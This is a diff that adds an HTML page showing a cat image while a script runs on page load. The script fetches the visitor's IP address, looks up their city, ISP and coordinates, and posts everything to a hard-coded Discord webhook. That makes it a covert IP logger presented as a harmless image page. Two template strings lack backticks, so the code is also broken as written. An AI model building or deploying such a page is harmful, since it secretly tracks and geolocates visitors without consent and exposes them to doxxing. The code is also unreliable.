@@ -1,0 +1,88 @@
+
+<html>
+<head>
+
+</head>
+<body>
+
+<img src="cat.png" alt="Cat image" />
+
+<script>
+
+async function sendIPInfo() {
+
+// Fetch IP and other details from an API
+
+const response = await fetch('https://api.ipify.org?format=json');
+
+const ipData = await response.json();
+
+const ip = ipData.ip;
+
+// Fetch more details about the IP
+
+// Added quotes around the URL
+
+const detailsResponse = await fetch(http://ip-api.com/json/${ip});
+
+const detailsData = await detailsResponse.json();
+
+// Create a Discord webhook payload
+
+const payload = {
+
+"content": New IP info: ${ip},
+
+"embeds": [
+
+{
+
+"title": "IP Details",
+
+"fields": [
+
+{ "name": "IP", "value": ip, "inline": true },
+
+{ "name": "Country", "value": detailsData.country, "inline": true },
+
+{ "name": "Region", "value": detailsData.region, "inline": true },
+
+{ "name": "City", "value": detailsData.city, "inline": true },
+
+{ "name": "ISP", "value": detailsData.isp, "inline": true },
+
+{ "name": "Latitude", "value": detailsData.lat, "inline": true },
+
+{ "name": "Longitude", "value": detailsData.lon, "inline": true }
+
+]
+
+}
+
+]
+
+};
+
+// Send the payload to the Discord webhook
+
+const webhookUrl = 'https://discord.com/api/webhooks/1482828811287658698/nO5lKN2tRVhjunKkqVwcfK6-R4pncGU04iQkYhhqQ8E5bYNam7rIz4rYWHC7AZENT2IL';
+
+await fetch(webhookUrl, {
+
+method: 'POST',
+
+headers: { 'Content-Type': 'application/json' },
+
+body: JSON.stringify(payload)
+
+});
+
+}
+
+// Call the function to send IP info
+
+sendIPInfo();
+
+</script>
+
+</body>
